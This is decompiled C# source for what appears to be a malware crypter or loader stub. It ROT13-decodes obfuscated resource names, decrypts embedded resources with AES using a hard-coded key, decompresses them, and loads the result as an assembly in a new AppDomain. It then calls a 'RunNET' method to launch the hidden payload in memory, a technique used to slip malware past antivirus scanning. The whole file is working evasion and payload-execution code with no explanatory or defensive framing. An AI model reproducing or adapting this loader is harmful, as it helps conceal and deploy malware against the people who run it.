using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public static class Deeldo
{
	public class InstanceProxy : MarshalByRefObject
	{
		public Assembly asm;

		public void Inu(string n, object[] p)
		{
			MethodInfo info = null;
			Type[] types = asm.GetTypes();
			foreach (Type type in types)
			{
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == n)
					{
						info = methodInfo;
						break;
					}
				}
			}
			Invoke(info, p);
		}

		public void Run(byte[] bytes)
		{
			//IL_0082: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				Type[] types = asm.GetTypes();
				foreach (Type type in types)
				{
					MethodInfo[] methods = type.GetMethods();
					foreach (MethodInfo methodInfo in methods)
					{
						if (methodInfo.Name == "RunNET")
						{
							Invoke(methodInfo, new object[2]
							{
								AppDomain.CurrentDomain,
								bytes
							});
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString());
			}
		}

		public InstanceProxy()
		{
			Class2.EN68eavznqBsn();
			asm = AppDomain.CurrentDomain.Load(Mountain(Dew(Decode("Lbh Fve.evfrNtnvafg"))));
			base._002Ector();
		}
	}

	public static List<Thread> Threads;

	public static void Main()
	{
		RunCreateThread(Decode("Fpevor"), new object[5]
		{
			Mountain(Dew(Decode("Ner Znq.evfrNtnvafg"))),
			true,
			"",
			true,
			0
		});
		foreach (Thread thread in Threads)
		{
			thread.Join();
		}
	}

	public static void RunCreateThread(string name, object[] paramss)
	{
		Thread thread = new Thread((ParameterizedThreadStart)Arizona);
		thread.Priority = ThreadPriority.AboveNormal;
		thread.Start(new object[2] { name, paramss });
		Threads.Add(thread);
	}

	public static byte[] Logitech(string A)
	{
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(A);
		byte[] array = new byte[manifestResourceStream.Length];
		manifestResourceStream.Read(array, 0, (int)manifestResourceStream.Length);
		return array;
	}

	public static byte[] Dew(string rName)
	{
		string[] array = Encoding.GetEncoding(1252).GetString(Logitech(rName)).Split(new char[1] { ',' });
		List<byte> list = new List<byte>();
		string[] array2 = array;
		foreach (string a in array2)
		{
			list.AddRange(Logitech(a));
		}
		return list.ToArray();
	}

	public static byte[] Mountain(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(new byte[46]
		{
			77, 63, 56, 68, 117, 69, 73, 47, 112, 79,
			120, 49, 82, 88, 125, 126, 101, 126, 62, 59,
			41, 97, 82, 116, 98, 51, 109, 113, 63, 51,
			85, 85, 70, 85, 66, 52, 122, 57, 119, 122,
			85, 99, 82, 50, 83, 38
		});
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		input = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
		using MemoryStream memoryStream = new MemoryStream();
		int num = BitConverter.ToInt32(input, 0);
		memoryStream.Write(input, 4, input.Length - 4);
		byte[] array2 = new byte[num];
		memoryStream.Position = 0L;
		using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
		{
			gZipStream.Read(array2, 0, array2.Length);
		}
		return array2;
	}

	public static void Arizona(object[] state)
	{
		object[] array = state;
		string text = (string)array[0];
		object[] array2 = (object[])array[1];
		AppDomain appDomain = AppDomain.CreateDomain("utx");
		InstanceProxy instanceProxy = (InstanceProxy)appDomain.CreateInstanceFromAndUnwrap(Assembly.GetExecutingAssembly().Location, typeof(InstanceProxy).ToString());
		if (instanceProxy != null)
		{
			if (text == "Fap" && Net((byte[])array2[0]))
			{
				instanceProxy.Run((byte[])array2[0]);
			}
			else
			{
				instanceProxy.Inu(text, array2);
			}
			AppDomain.Unload(appDomain);
		}
	}

	public static bool Net(byte[] bytes)
	{
		try
		{
			Assembly.Load(bytes);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static void Invoke(MethodInfo info, object[] invokeParams)
	{
		info.Invoke(null, invokeParams);
	}

	public static object[] GetInfo(byte[] data, AppDomain domain)
	{
		return new object[2]
		{
			null,
			domain.Load(data)
		};
	}

	public static string Decode(string input)
	{
		char[] array = input.ToCharArray();
		int num = 13;
		for (int i = 0; i < array.Length; i++)
		{
			if (array[i] <= 'Z' && array[i] >= 'A')
			{
				array[i] = (char)((array[i] - 65 + num) % 26 + 65);
			}
			if (array[i] <= 'z' && array[i] >= 'a')
			{
				array[i] = (char)((array[i] - 97 + num) % 26 + 97);
			}
		}
		return new string(array);
	}

	static Deeldo()
	{
		Class2.EN68eavznqBsn();
		Threads = new List<Thread>();
	}
}
